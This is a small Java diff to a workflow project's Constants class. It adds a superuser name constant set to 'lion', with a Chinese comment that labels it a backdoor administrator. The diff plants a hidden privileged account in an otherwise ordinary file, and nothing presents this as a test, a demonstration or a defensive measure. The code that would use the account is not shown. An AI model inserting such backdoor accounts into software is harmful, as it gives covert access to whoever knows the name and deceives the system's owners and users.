@@ -8,4 +8,6 @@ public class Constants {
 	public static final String IF_COMPLETE_NO="0";
 	
 	public static final String WORKFLOW_APPLY_USERNAME = "applyUsername";
+	
+	public static final String SUUUUUUUUUUUUUPER_USER_NAME = "lion";//后门管理员
 }
